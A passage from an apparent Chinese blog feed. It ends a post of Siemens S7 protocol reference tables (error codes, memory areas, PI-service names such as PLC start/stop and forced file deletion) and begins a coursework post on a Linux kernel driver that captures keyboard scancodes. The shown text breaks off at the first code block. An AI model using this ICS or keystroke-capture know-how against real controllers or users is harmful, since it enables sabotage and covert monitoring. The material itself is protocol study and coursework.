style="text-align:center">块中发生结构错误</td></tr><tr><td style="text-align:center">0xD230</td><td style="text-align:center">块中发生结构错误</td></tr><tr><td style="text-align:center">0xD231</td><td style="text-align:center">至少有一个已加载的 OB 无法复制，因为关联的优先级不存在</td></tr><tr><td style="text-align:center">0xD232</td><td style="text-align:center">加载块的至少一个块编号是非法的</td></tr><tr><td style="text-align:center">0xD234</td><td style="text-align:center">块在指定的内存介质或作业中存在两次</td></tr><tr><td style="text-align:center">0xD235</td><td style="text-align:center">该块包含不正确的校验和</td></tr><tr><td style="text-align:center">0xD236</td><td style="text-align:center">该块不包含校验和</td></tr><tr><td style="text-align:center">0xD237</td><td style="text-align:center">您将要加载块两次，即 CPU 上已存在具有相同时间戳的块</td></tr><tr><td style="text-align:center">0xD238</td><td style="text-align:center">指定的块中至少有一个不是 DB</td></tr><tr><td style="text-align:center">0xD239</td><td style="text-align:center">至少有一个指定的 DB 在装载存储器中不可用作链接变量</td></tr><tr><td style="text-align:center">0xD23A</td><td style="text-align:center">至少有一个指定的 DB 与复制和链接的变体有很大不同</td></tr><tr><td style="text-align:center">0xD240</td><td style="text-align:center">违反了协调规则</td></tr><tr><td style="text-align:center">0xD241</td><td style="text-align:center">当前保护级别不允许该功能</td></tr><tr><td style="text-align:center">0xD242</td><td style="text-align:center">处理 F 块时的保护冲突</td></tr><tr><td style="text-align:center">0xD250</td><td style="text-align:center">更新和模块 ID 或版本不匹配</td></tr><tr><td style="text-align:center">0xD251</td><td style="text-align:center">操作系统组件序列不正确</td></tr><tr><td style="text-align:center">0xD252</td><td style="text-align:center">校验和错误</td></tr><tr><td style="text-align:center">0xD253</td><td style="text-align:center">没有可用的可执行加载程序; 只能使用存储卡进行更新</td></tr><tr><td style="text-align:center">0xD254</td><td style="text-align:center">操作系统中的存储错误</td></tr><tr><td style="text-align:center">0xD280</td><td style="text-align:center">在 S7-300 CPU 中编译块时出错</td></tr><tr><td style="text-align:center">0xD2A1</td><td style="text-align:center">块上的另一个块功能或触发器处于活动状态</td></tr><tr><td style="text-align:center">0xD2A2</td><td style="text-align:center">块上的触发器处于活动状态。首先完成调试功能</td></tr><tr><td style="text-align:center">0xD2A3</td><td style="text-align:center">块未激活（链接），块被占用或块当前被标记为删除</td></tr><tr><td style="text-align:center">0xD2A4</td><td style="text-align:center">该块已被另一个块函数处理</td></tr><tr><td style="text-align:center">0xD2A6</td><td style="text-align:center">无法同时保存和更改用户程序</td></tr><tr><td style="text-align:center">0xD2A7</td><td style="text-align:center">块具有“未链接”属性或未处理</td></tr><tr><td style="text-align:center">0xD2A8</td><td style="text-align:center">激活的调试功能阻止将参数分配给 CPU</td></tr><tr><td style="text-align:center">0xD2A9</td><td style="text-align:center">正在为 CPU 分配新参数</td></tr><tr><td style="text-align:center">0xD2AA</td><td style="text-align:center">当前正在为模块分配新参数</td></tr><tr><td style="text-align:center">0xD2AB</td><td style="text-align:center">当前正在更改动态配置限制</td></tr><tr><td style="text-align:center">0xD2AC</td><td style="text-align:center">正在运行的激活或取消激活分配（SFC 12）暂时阻止 R-KiR 过程</td></tr><tr><td style="text-align:center">0xD2B0</td><td style="text-align:center">在 RUN（CiR）中配置时发生错误</td></tr><tr><td style="text-align:center">0xD2C0</td><td style="text-align:center">已超出最大工艺对象数</td></tr><tr><td style="text-align:center">0xD2C1</td><td style="text-align:center">模块上已存在相同的技术数据块</td></tr><tr><td style="text-align:center">0xD2C2</td><td style="text-align:center">无法下载用户程序或下载硬件配置</td></tr><tr><td style="text-align:center">0xD401</td><td style="text-align:center">信息功能不可用</td></tr><tr><td style="text-align:center">0xD402</td><td style="text-align:center">信息功能不可用</td></tr><tr><td style="text-align:center">0xD403</td><td style="text-align:center">服务已登录/注销（诊断/ PMC）</td></tr><tr><td style="text-align:center">0xD404</td><td style="text-align:center">达到的最大节点数。不再需要登录诊断/ PMC</td></tr><tr><td style="text-align:center">0xD405</td><td style="text-align:center">不支持服务或函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD406</td><td style="text-align:center">当前不可用的必需信息</td></tr><tr><td style="text-align:center">0xD407</td><td style="text-align:center">发生诊断错误</td></tr><tr><td style="text-align:center">0xD408</td><td style="text-align:center">更新已中止</td></tr><tr><td style="text-align:center">0xD409</td><td style="text-align:center">DP 总线错误</td></tr><tr><td style="text-align:center">0xD601</td><td style="text-align:center">函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD602</td><td style="text-align:center">输入的密码不正确</td></tr><tr><td style="text-align:center">0xD603</td><td style="text-align:center">连接已合法化</td></tr><tr><td style="text-align:center">0xD604</td><td style="text-align:center">已启用连接</td></tr><tr><td style="text-align:center">0xD605</td><td style="text-align:center">由于密码不存在，因此无法进行合法化</td></tr><tr><td style="text-align:center">0xD801</td><td style="text-align:center">至少有一个标记地址无效</td></tr><tr><td style="text-align:center">0xD802</td><td style="text-align:center">指定的作业不存在</td></tr><tr><td style="text-align:center">0xD803</td><td style="text-align:center">非法的工作状态</td></tr><tr><td style="text-align:center">0xD804</td><td style="text-align:center">非法循环时间（非法时基或多个）</td></tr><tr><td style="text-align:center">0xD805</td><td style="text-align:center">不能再设置循环读取作业</td></tr><tr><td style="text-align:center">0xD806</td><td style="text-align:center">引用的作业处于无法执行请求的功能的状态</td></tr><tr><td style="text-align:center">0xD807</td><td style="text-align:center">功能因过载而中止，这意味着执行读取周期所需的时间比设置的扫描周期时间长</td></tr><tr><td style="text-align:center">0xDC01</td><td style="text-align:center">日期和/或时间无效</td></tr><tr><td style="text-align:center">0xE201</td><td style="text-align:center">CPU 已经是主设备</td></tr><tr><td style="text-align:center">0xE202</td><td style="text-align:center">由于闪存模块中的用户程序不同，无法进行连接和更新</td></tr><tr><td style="text-align:center">0xE203</td><td style="text-align:center">由于固件不同，无法连接和更新</td></tr><tr><td style="text-align:center">0xE204</td><td style="text-align:center">由于内存配置不同，无法连接和更新</td></tr><tr><td style="text-align:center">0xE205</td><td style="text-align:center">由于同步错误导致连接/更新中止</td></tr><tr><td style="text-align:center">0xE206</td><td style="text-align:center">由于协调违规而拒绝连接/更新</td></tr><tr><td style="text-align:center">0xEF01</td><td style="text-align:center">S7 协议错误：ID2 错误; 工作中只允许 00H</td></tr><tr><td style="text-align:center">0xEF02</td><td style="text-align:center">S7 协议错误：ID2 错误; 资源集不存在</td></tr></tbody></table><h2 id="Item-结构中-Syntax-Id-取值"><a href="#Item-结构中-Syntax-Id-取值" class="headerlink" title="Item 结构中 Syntax Id 取值"></a>Item 结构中 Syntax Id 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">0x10</td><td style="text-align:center">S7ANY</td><td>Address data S7-Any pointer-like DB1.DBX10.2</td></tr><tr><td style="text-align:center">0x13</td><td style="text-align:center">PBC-R_ID</td><td>R_ID for PBC</td></tr><tr><td style="text-align:center">0x15</td><td style="text-align:center">ALARM_LOCKFREE</td><td>Alarm lock/free dataset</td></tr><tr><td style="text-align:center">0x16</td><td style="text-align:center">ALARM_IND</td><td>Alarm indication dataset</td></tr><tr><td style="text-align:center">0x19</td><td style="text-align:center">ALARM_ACK</td><td>Alarm acknowledge message dataset</td></tr><tr><td style="text-align:center">0x1a</td><td style="text-align:center">ALARM_QUERYREQ</td><td>Alarm query request dataset</td></tr><tr><td style="text-align:center">0x1c</td><td style="text-align:center">NOTIFY_IND</td><td>Notify indication dataset</td></tr><tr><td style="text-align:center">0xa2</td><td style="text-align:center">DRIVEESANY</td><td>seen on Drive ES Starter with routing over S7</td></tr><tr><td style="text-align:center">0xb2</td><td style="text-align:center">1200SYM</td><td>Symbolic address mode of S7-1200</td></tr><tr><td style="text-align:center">0xb0</td><td style="text-align:center">DBREAD</td><td>Kind of DB block read, seen only at an S7-400</td></tr><tr><td style="text-align:center">0x82</td><td style="text-align:center">NCK</td><td>Sinumerik NCK HMI access</td></tr></tbody></table><h2 id="Item-结构中-Transport-size-取值"><a href="#Item-结构中-Transport-size-取值" class="headerlink" title="Item 结构中 Transport size 取值"></a>Item 结构中 Transport size 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">NULL</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">BIT</td><td style="text-align:center">bit access, len is in bits</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">BYTE/WORD/DWORD</td><td style="text-align:center">byte/word/dword access, len is in bits</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">INTEGER</td><td style="text-align:center">integer access, len is in bits</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">DINTEGER</td><td style="text-align:center">integer access, len is in bytes</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">REAL</td><td style="text-align:center">real access, len is in bytes</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">OCTET STRING</td><td style="text-align:center">octet string, len is in bytes</td></tr></tbody></table><h2 id="Item-结构中-Area-取值"><a href="#Item-结构中-Area-取值" class="headerlink" title="Item 结构中 Area 取值"></a>Item 结构中 Area 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">Value</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x03</td><td style="text-align:center">System info of 200 family</td><td style="text-align:center">200 系列系统信息</td></tr><tr><td style="text-align:center">0x05</td><td style="text-align:center">System flags of 200 family</td><td style="text-align:center">200 系列系统标志</td></tr><tr><td style="text-align:center">0x06</td><td style="text-align:center">Analog inputs of 200 family</td><td style="text-align:center">200 系列模拟量输入</td></tr><tr><td style="text-align:center">0x07</td><td style="text-align:center">Analog outputs of 200 family</td><td style="text-align:center">200 系列模拟量输出</td></tr><tr><td style="text-align:center">0x80</td><td style="text-align:center">Direct peripheral access (P)</td><td style="text-align:center">直接访问外设</td></tr><tr><td style="text-align:center">0x81</td><td style="text-align:center">Inputs (I)</td><td style="text-align:center">输入（I）</td></tr><tr><td style="text-align:center">0x82</td><td style="text-align:center">Outputs (Q)</td><td style="text-align:center">输出（Q）</td></tr><tr><td style="text-align:center">0x83</td><td style="text-align:center">Flags (M)</td><td style="text-align:center">内部标志（M）</td></tr><tr><td style="text-align:center">0x84</td><td style="text-align:center">Data blocks (DB)</td><td style="text-align:center">数据块（DB）</td></tr><tr><td style="text-align:center">0x85</td><td style="text-align:center">Instance data blocks (DI)</td><td style="text-align:center">背景数据块（DI）</td></tr><tr><td style="text-align:center">0x86</td><td style="text-align:center">Local data (L)</td><td style="text-align:center">局部变量（L）</td></tr><tr><td style="text-align:center">0x87</td><td style="text-align:center">Unknown yet (V)</td><td style="text-align:center">全局变量（V）</td></tr><tr><td style="text-align:center">0x1c</td><td style="text-align:center">S7 counters (C)</td><td style="text-align:center">S7 计数器（C）</td></tr><tr><td style="text-align:center">0x1d</td><td style="text-align:center">S7 timers (T)</td><td style="text-align:center">S7 定时器（T）</td></tr><tr><td style="text-align:center">0x1e</td><td style="text-align:center">IEC counters (200 family)</td><td style="text-align:center">IEC 计数器（200 系列）</td></tr><tr><td style="text-align:center">0x1f</td><td style="text-align:center">IEC timers (200 family)</td><td style="text-align:center">IEC 定时器（200 系列）</td></tr></tbody></table><h2 id="Item-结构中-Return-code-取值"><a href="#Item-结构中-Return-code-取值" class="headerlink" title="Item 结构中 Return code 取值"></a>Item 结构中 Return code 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x00</td><td style="text-align:center">Reserved</td><td style="text-align:center">未定义，预留</td></tr><tr><td style="text-align:center">0x01</td><td style="text-align:center">Hardware error</td><td style="text-align:center">硬件错误</td></tr><tr><td style="text-align:center">0x03</td><td style="text-align:center">Accessing the object not allowed</td><td style="text-align:center">对象不允许访问</td></tr><tr><td style="text-align:center">0x05</td><td style="text-align:center">Invalid address</td><td style="text-align:center">无效地址，所需的地址超出此 PLC 的极限</td></tr><tr><td style="text-align:center">0x06</td><td style="text-align:center">Data type not supported</td><td style="text-align:center">数据类型不支持</td></tr><tr><td style="text-align:center">0x07</td><td style="text-align:center">Data type inconsistent</td><td style="text-align:center">日期类型不一致</td></tr><tr><td style="text-align:center">0x0a</td><td style="text-align:center">Object does not exist</td><td style="text-align:center">对象不存在</td></tr><tr><td style="text-align:center">0xff</td><td style="text-align:center">Success</td><td style="text-align:center">成功</td></tr></tbody></table><h2 id="西门子设备中-8-种不同类型的功能块"><a href="#西门子设备中-8-种不同类型的功能块" class="headerlink" title="西门子设备中 8 种不同类型的功能块"></a>西门子设备中 8 种不同类型的功能块</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">类型</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x3038</td><td style="text-align:center">OB，ASCII 为’08’，组织块</td><td style="text-align:center">OB 决定用户程序的结构</td></tr><tr><td style="text-align:center">0x3039</td><td style="text-align:center">CMod，ASCII 为’09’</td></tr><tr><td style="text-align:center">0x3041</td><td style="text-align:center">DB，ASCII 为’0A’，数据块</td><td style="text-align:center">DB 是用于存储用户数据的数据区域，除了指定给一个功能块的数据，还可以定义可以被任何块使用的共享数据</td></tr><tr><td style="text-align:center">0x3042</td><td style="text-align:center">SDB，ASCII 为’0B’，系统和数据块</td><td style="text-align:center">由编程软件自动生成主要存放 PLC 的硬件组态等信息，用户无法直接打开和更改</td></tr><tr><td style="text-align:center">0x3043</td><td style="text-align:center">FC，ASCII 为’0C’，功能</td><td style="text-align:center">FB、FC 本质都是一样的，都相当于子程序，可以被其他程序调用（也可以调用其他子程序），FC 使用的是共享数据块</td></tr><tr><td style="text-align:center">0x3044</td><td style="text-align:center">SFC，ASCII 为’0D’，系统功能</td><td style="text-align:center">SFB 和 SFC 集成在 S7 CPU 中可以让你访问一些重要的系统功能</td></tr><tr><td style="text-align:center">0x3045</td><td style="text-align:center">FB，ASCII 为’0E’，功能块，带背景数据块</td><td style="text-align:center">FB、FC 本质都是一样的，都相当于子程序，可以被其他程序调用（也可以调用其他子程序），FB 使用的是背景数据块</td></tr><tr><td style="text-align:center">0x3046</td><td style="text-align:center">SFB，ASCII 为’0F’，系统功能块</td><td style="text-align:center">SFB 和 SFC 集成在 S7 CPU 中可以让你访问一些重要的系统功能</td></tr></tbody></table><p>OB、FB、SFB、FC 和 SFC 都包含部分程序，因此也称作逻辑块。每种块类型所允许的块的数量以及块的长度视 CPU 而定。</p><h2 id="请求下载的目标文件系统类型"><a href="#请求下载的目标文件系统类型" class="headerlink" title="请求下载的目标文件系统类型"></a>请求下载的目标文件系统类型</h2><ul><li>P（Passive <em>copied, but not chained</em> module）：被动文件系统；</li><li>A（Active embedded module）：主动文件系统；</li><li>B（Active as well as passive module）：既主既被文件系统。</li></ul><h2 id="程序调用服务名"><a href="#程序调用服务名" class="headerlink" title="程序调用服务名"></a>程序调用服务名</h2><table><thead><tr><th style="text-align:center">服务名称</th><th style="text-align:center">值（描述）</th></tr></thead><tbody><tr><td style="text-align:center"><code>UNKNOWN</code></td><td style="text-align:center">PI-Service 目前不详</td></tr><tr><td style="text-align:center"><code>_INSE</code></td><td style="text-align:center">PI-Service <code>_INSE</code>（激活 PLC 模块）</td></tr><tr><td style="text-align:center"><code>_DELE</code></td><td style="text-align:center">PI-Service <code>_DELE</code>（从 PLC 的被动文件系统中删除模块）</td></tr><tr><td style="text-align:center"><code>P_PROGRAM</code></td><td style="text-align:center">PI-Service <code>P_PROGRAM</code>（PLC 启动/停止）</td></tr><tr><td style="text-align:center"><code>_MODU</code></td><td style="text-align:center">PI-Service <code>_MODU</code>（PLC Copy Ram to Rom）</td></tr><tr><td style="text-align:center"><code>_GARB</code></td><td style="text-align:center">PI-Service <code>_GARB</code>（压缩 PLC 内存）</td></tr><tr><td style="text-align:center"><code>N_LOGIN</code></td><td style="text-align:center">PI-Service <code>_N_LOGIN_</code>（登录）</td></tr><tr><td style="text-align:center"><code>_N_LOGOUT</code></td><td style="text-align:center">PI-Service <code>_N_LOGOUT</code>（退出）</td></tr><tr><td style="text-align:center"><code>_N_CANCEL</code></td><td style="text-align:center">PI-Service <code>_N_CANCEL</code>（取消 NC 报警）</td></tr><tr><td style="text-align:center"><code>_N_DASAVE</code></td><td style="text-align:center">PI-Service <code>_N_DASAVE</code>（用于将数据从 SRAM 复制到 FLASH 的 PI-Service）</td></tr><tr><td style="text-align:center"><code>_N_DIGIOF P</code></td><td style="text-align:center">I-Service <code>_N_DIGIOF</code>（关闭数字化）</td></tr><tr><td style="text-align:center"><code>_N_DIGION</code></td><td style="text-align:center">PI-Service <code>_N_DIGION</code>（打开数字化）</td></tr><tr><td style="text-align:center"><code>N_DZERO</code></td><td style="text-align:center">PI-Service <code>_N_DZERO_</code>（设置所有 D nos。对于函数无效“唯一 D 号。”）</td></tr><tr><td style="text-align:center"><code>_N_ENDEXT</code></td><td style="text-align:center">PI-Service <code>_N_ENDEXT</code></td></tr><tr><td style="text-align:center"><code>_N_F_OPER</code></td><td style="text-align:center">PI-Service <code>_N_F_OPER</code>（以只读方式打开文件）</td></tr><tr><td style="text-align:center"><code>_N_OST_OF</code></td><td style="text-align:center">PI-Service <code>_N_OST_OF</code>（Overstore OFF）</td></tr><tr><td style="text-align:center"><code>_N_OST_ON</code></td><td style="text-align:center">PI-Service <code>_N_OST_ON</code>（Overstore ON）</td></tr><tr><td style="text-align:center"><code>N_SCALE</code></td><td style="text-align:center">PI-Service <code>_N_SCALE_</code>（测量单位设置）</td></tr><tr><td style="text-align:center"><code>_N_SETUFR</code></td><td style="text-align:center">PI-Service <code>_N_SETUFR</code>（激活用户帧）</td></tr><tr><td style="text-align:center"><code>_N_STRTLK</code></td><td style="text-align:center">PI-Service <code>_N_STRTLK</code>（设置全局启动禁用）</td></tr><tr><td style="text-align:center"><code>_N_STRTUL</code></td><td style="text-align:center">PI-Service <code>_N_STRTUL</code>（重置全局启动禁用）</td></tr><tr><td style="text-align:center"><code>_N_TMRASS</code></td><td style="text-align:center">PI-Service <code>_N_TMRASS</code>（重置活动状态）</td></tr><tr><td style="text-align:center"><code>_N_F_DELE</code></td><td style="text-align:center">PI-Service <code>_N_F_DELE</code>（删除文件）</td></tr><tr><td style="text-align:center"><code>_N_EXTERN</code></td><td style="text-align:center">PI-Service <code>_N_EXTERN</code>（选择外部程序执行）</td></tr><tr><td style="text-align:center"><code>_N_EXTMOD</code></td><td style="text-align:center">PI-Service <code>_N_EXTMOD</code>（选择外部程序执行）</td></tr><tr><td style="text-align:center"><code>_N_F_DELR</code></td><td style="text-align:center">PI-Service <code>_N_F_DELR</code>（即使没有访问权限也删除文件）</td></tr><tr><td style="text-align:center"><code>_N_F_XFER</code></td><td style="text-align:center">PI-Service <code>_N_F_XFER</code>（选择要上传的文件）</td></tr><tr><td style="text-align:center"><code>N_LOCKE</code></td><td style="text-align:center">PI-Service <code>_N_LOCKE_</code>（锁定活动文件以进行编辑）</td></tr><tr><td style="text-align:center"><code>_N_SELECT</code></td><td style="text-align:center">PI-Service <code>_N_SELECT</code>（选择要执行的程序）</td></tr><tr><td style="text-align:center"><code>_N_SRTEXT</code></td><td style="text-align:center">PI-Service <code>_N_SRTEXT</code>（文件正在 <code>_N_EXT_DIR</code> 中标记）</td></tr><tr><td style="text-align:center"><code>_N_F_CLOS</code></td><td style="text-align:center">PI-Service <code>_N_F_CLOS</code>（关闭文件）</td></tr><tr><td style="text-align:center"><code>_N_F_OPEN</code></td><td style="text-align:center">PI-Service <code>_N_F_OPEN</code>（打开文件）</td></tr><tr><td style="text-align:center"><code>_N_F_SEEK</code></td><td style="text-align:center">PI-Service <code>_N_F_SEEK</code>（定位文件搜索指针）</td></tr><tr><td style="text-align:center"><code>N_ASUP_</code></td><td style="text-align:center">PI-Service <code>_N_ASUP</code>（分配中断）</td></tr><tr><td style="text-align:center"><code>_N_CHEKDM</code></td><td style="text-align:center">PI-Service <code>_N_CHEKDM</code>（对 D 号码启动唯一性检查）</td></tr><tr><td style="text-align:center"><code>_N_CHKDNO</code></td><td style="text-align:center">PI-Service <code>_N_CHKDNO</code>（检查工具是否具有唯一的 D 编号）</td></tr><tr><td style="text-align:center"><code>_N_CONFIG</code></td><td style="text-align:center">PI-Service <code>_N_CONFIG</code>（重新配置机器数据）</td></tr><tr><td style="text-align:center"><code>_N_CRCEDN</code></td><td style="text-align:center">PI-Service <code>_N_CRCEDN</code>（通过指定边数来创建切削刃）</td></tr><tr><td style="text-align:center"><code>_N_DELECE</code></td><td style="text-align:center">PI-Service <code>_N_DELECE</code>（删除最前沿）</td></tr><tr><td style="text-align:center"><code>_N_CREACE</code></td><td style="text-align:center">PI-Service <code>_N_CREACE</code>（创造最前沿）</td></tr><tr><td style="text-align:center"><code>_N_CREATO</code></td><td style="text-align:center">PI-Service <code>_N_CREATO</code>（创建工具）</td></tr><tr><td style="text-align:center"><code>_N_DELETO</code></td><td style="text-align:center">PI-Service <code>_N_DELETO</code>（删除工具）</td></tr><tr><td style="text-align:center"><code>_N_CRTOCE</code></td><td style="text-align:center">PI-Service <code>_N_CRTOCE</code>（生成具有指定边数的工具）</td></tr><tr><td style="text-align:center"><code>_N_DELVAR</code></td><td style="text-align:center">PI-Service <code>_N_DELVAR</code>（删除数据块）</td></tr><tr><td style="text-align:center"><code>_N_F_COPY</code></td><td style="text-align:center">PI-Service <code>_N_F_COPY</code>（复制 NCK 中的文件）</td></tr><tr><td style="text-align:center"><code>_N_F_DMDA</code></td><td style="text-align:center">PI-Service <code>_N_F_DMDA</code>（删除 MDA 内存）</td></tr><tr><td style="text-align:center"><code>_N_F_PROT</code></td><td style="text-align:center">PI-Service <code>_N_F_PROT</code>（为文件指定保护级别）</td></tr><tr><td style="text-align:center"><code>_N_F_RENA</code></td><td style="text-align:center">PI-Service <code>_N_F_RENA</code>（重命名文件）</td></tr><tr><td style="text-align:center"><code>_N_FINDBL</code></td><td style="text-align:center">PI-Service <code>_N_FINDBL</code>（激活搜索）</td></tr><tr><td style="text-align:center"><code>_N_IBN_SS</code></td><td style="text-align:center">PI-Service <code>_N_IBN_SS</code>（设置设置开关）</td></tr><tr><td style="text-align:center"><code>_N_MMCSEM</code></td><td style="text-align:center">PI-Service <code>_N_MMCSEM</code>（MMC-Semaphore）</td></tr><tr><td style="text-align:center"><code>_N_NCKMOD</code></td><td style="text-align:center">PI-Service <code>_N_NCKMOD</code>（正在设置 NCK 工作的模式）</td></tr><tr><td style="text-align:center"><code>_N_NEWPWD</code></td><td style="text-align:center">PI-Service <code>_N_NEWPWD</code>（新密码）</td></tr><tr><td style="text-align:center"><code>_N_SEL_BL</code></td><td style="text-align:center">PI-Service <code>_N_SEL_BL</code>（选择新块）</td></tr><tr><td style="text-align:center"><code>_N_SETTST</code></td><td style="text-align:center">PI-Service <code>_N_SETTST</code>（激活替换工具组的工具）</td></tr><tr><td style="text-align:center"><code>_N_TMAWCO</code></td><td style="text-align:center">PI-Service <code>_N_TMAWCO</code>（在一个杂志中设置有效磨损组）</td></tr><tr><td style="text-align:center"><code>_N_TMCRTC</code></td><td style="text-align:center">PI-Service <code>_N_TMCRTC</code>（创建具有指定边数的工具）</td></tr><tr><td style="text-align:center"><code>_N_TMCRTO</code></td><td style="text-align:center">PI-Service <code>_N_TMCRTO</code>（在工具管理中创建工具）</td></tr><tr><td style="text-align:center"><code>_N_TMFDPL</code></td><td style="text-align:center">PI-Service <code>_N_TMFDPL</code>（搜索空白处加载）</td></tr><tr><td style="text-align:center"><code>_N_TMFPBP</code></td><td style="text-align:center">PI-Service <code>_N_TMFPBP</code>（搜索空位）</td></tr><tr><td style="text-align:center"><code>_N_TMGETT</code></td><td style="text-align:center">PI-Service <code>_N_TMGETT</code>（使用 Duplono 确定特定工具 ID 的 T 编号）</td></tr><tr><td style="text-align:center"><code>_N_TMMVTL</code></td><td style="text-align:center">PI-Service <code>_N_TMMVTL</code>（加载或卸载工具）</td></tr><tr><td style="text-align:center"><code>_N_TMPCIT</code></td><td style="text-align:center">PI-Service <code>_N_TMPCIT</code>（设置计件器的增量值）</td></tr><tr><td style="text-align:center"><code>_N_TMPOSM</code></td><td style="text-align:center">PI-Service <code>_N_TMPOSM</code>（定位杂志或工具）</td></tr><tr><td style="text-align:center"><code>_N_TRESMO</code></td><td style="text-align:center">PI-Service <code>_N_TRESMO</code>（重置监控值）</td></tr><tr><td style="text-align:center"><code>_N_TSEARC</code></td><td style="text-align:center">PI-Service <code>_N_TSEARC</code>（通过搜索屏幕进行复杂搜索）</td></tr></tbody></table><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://wooyun.js.org/drops/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90.html</a><br><a href="https://xuanxuanblingbling.github.io/ics/2020/01/10/ics/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ics/2020/01/10/ics/</a><br><a href="https://www.cnpanda.net/sec/592.html" target="_blank" rel="noopener">https://www.cnpanda.net/sec/592.html</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/</a><br><a href="https://www.cnpanda.net/sec/578.html" target="_blank" rel="noopener">https://www.cnpanda.net/sec/578.html</a><br><a href="https://www.bilibili.com/video/BV1Ft41177cs" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ft41177cs</a><br><a href="https://www.bilibili.com/video/BV15J411P77f" target="_blank" rel="noopener">https://www.bilibili.com/video/BV15J411P77f</a><br><a href="https://www.youtube.com/watch?v=LyzIrE6DpOM" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LyzIrE6DpOM</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实现获取键盘中断的字符设备驱动程序</title>
    <link href="/2020/05/31/%E5%AE%9E%E7%8E%B0%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
    <url>/2020/05/31/%E5%AE%9E%E7%8E%B0%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p>Unix 系统分析大作业，主要实现在内核模块中截获键盘中断扫描码存入驱动程序的自定义缓冲区，并通过用户空间应用程序打开设备以获取相应的扫描码。</p><a id="more"></a><p>在学习 Kernel Exploitation 时接触到 2017-CISCN-babydriver 这道题，其中也是注册了一个字符设备，注册设备的过程直接可以搬来用。</p><h1 id="一、-系统需求"><a href="#一、-系统需求" class="headerlink" title="一、 系统需求"></a>一、 系统需求</h1><ol><li>设计一个字符设备驱动程序，要求完成以下功能：<ol><li>通过键盘中断来记录用户按键，并保存在内部缓冲区中；</li><li>驱动程序提供 <code>read</code> 方法，应用程序可以来读按键缓冲区数据；</li><li>驱动程序实现 sysfs，提供 <code>count</code> 属性（读），用于获得当前缓冲区未读的按键数量，提供 <code>buf_size</code> 属性（读、写），用于获取和设置按键缓冲区大小。</li><li>在 <code>/dev</code> 目录下，创建对应的设备文件（文件名、主设备号、次设备号），可以静态创建，也可以在驱动程序中动态创建。</li></ol></li><li>其他要求：<ol><li>编写一个应用程序来测试上述驱动，读取按键、读取 <code>count</code>、<code>buf_size</code> 等属性；</li><li>可以直接访问对应的 sysfs 下文件，访问 <code>count</code> 及 <code>buf_size</code> 属性。</li></ol></li></ol><h1 id="二、-原理"><a href="#二、-原理" class="headerlink" title="二、 原理"></a>二、 原理</h1><ol><li>中断指在接收到来自外围硬件的异步信号，或来自软件的同步信号之后，处理器将会进行相应的硬件／软件处理。在内核模块中，通过中断请求（IRQ）来截获键盘中断，并将对应按键的扫描码存储在自定义的缓冲区中。</li><li>Linux 中的字符设备提供连续的数据流，应用程序可以顺序读取，通常不支持随机存取。相反，此类设备支持按字节/字符来读写数据。举例来说，键盘、串口、调制解调器都是典型的字符设备。通过编写内核模块，动态创建一个字符设备驱动程序，提供相应的 read 函数让用户空间对存储的键盘扫描码进行访问。</li><li>Sysfs 是 Linux 2.6 所提供的一种虚拟文件系统。这个文件系统不仅可以把设备（devices）和驱动程序（drivers）的信息从内核输出到用户空间，也可以用来对设备和驱动程序做设置。在驱动程序中实现 sysfs，创建相关属性来读写对模块中的某些全局变量。</li></ol><h1 id="三、-核心源程序代码及说明"><a href="#三、-核心源程序代码及说明" class="headerlink" title="三、 核心源程序代码及说明"></a>三、 核心源程序代码及说明</h1><p>一开始对一些全局变量进行定义，驱动程序相关的有设备号、字符设备结构体以及对应的类。在截获键盘中断的部分设置了两个无符号字符型变量用于存储键盘扫描码和状态，<code>key_count</code> 和 <code>buf_size</code> 分别是字符设备驱动程序对应的两个属性，key_buf 是用于存储键盘扫描码的 kfifo 缓冲区队列，最后初始化一个互斥锁、一个自旋锁和一个等待队列：</p><pre><code class="cpp">// Variables for device creationdev_t dev_id; // 设备号struct cdev key_dev; // 字符设备结构体struct class *key_class; // 字符设备对应的类// Variables for keyboard interruptstatic unsigned char scancode, status; // 键盘扫描码、状态static int key_count = 